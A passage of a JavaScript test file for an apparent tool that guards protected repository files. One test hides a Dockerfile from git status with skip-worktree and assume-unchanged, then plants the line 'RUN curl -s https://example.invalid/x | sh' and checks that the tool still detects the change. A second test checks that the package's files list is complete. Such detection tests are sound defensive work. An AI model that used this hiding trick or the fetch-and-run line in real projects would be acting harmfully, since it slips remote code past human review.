    g('update-index', '--skip-worktree', 'Dockerfile'); g('update-index', '--assume-unchanged', 'Dockerfile');
    assert.deepEqual(Object.keys(protectedDirty(d)), [], 'hidden, and still as HEAD holds it: not a change');
    writeFileSync(join(d, 'Dockerfile'), 'FROM node:22\nRUN curl -s https://example.invalid/x | sh\n');
    assert.equal(porcelain(d), '', 'git status shows nothing: that is the attack');
    assert.deepEqual(Object.keys(protectedDirty(d)), ['Dockerfile'], 'the check sees it all the same');
    assert.equal(mandateHits(d, Object.keys(protectedDirty(d)))[0].name, 'images-frozen');
  } finally { rmSync(d, { recursive: true, force: true }); }
});

// ---- what is packed is what runs ------------------------------------------------------------------------------------
// The package holds the files its `files` list names and no others. A module the code names that is not in the list
// is in every checkout and in no install. 0.2.5 as first assembled left out align.mjs, lookback.mjs and offer.mjs:
// every suite passed, because a suite runs from the tree, and the packed copy could not start. The pack check found
// it on 2026-11-22. This finds it in the suite, and by name. Two forms are read: a module that is imported
// ('./name.mjs') and one that is started as its own process (join(HERE, 'name.mjs')).
test('package: every module the packed code names is in the files list', () => {
  const root = join(HERE, '..'); const pkg = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
  const listed = new Set(pkg.files); const missing = [];
  for (const b of Object.values(pkg.bin)) assert.ok(listed.has(b), `the command's own file, ${b}, is packed`);
  for (const f of pkg.files) assert.ok(existsSync(join(root, f)), `${f} is in the files list and is in the tree`);
  for (const f of pkg.files.filter((x) => x.endsWith('.mjs'))) {
    const src = readFileSync(join(root, f), 'utf8');
    for (const m of src.matchAll(/['"`](?:\.\/)?([A-Za-z0-9_-]+\.mjs)['"`]/g)) {
      if (!listed.has(m[1]) && existsSync(join(root, m[1]))) missing.push(`${f} names ${m[1]}`);
    }
  }
  assert.deepEqual([...new Set(missing)], [], 'named by the packed code, in the tree, and not in the files list');
});
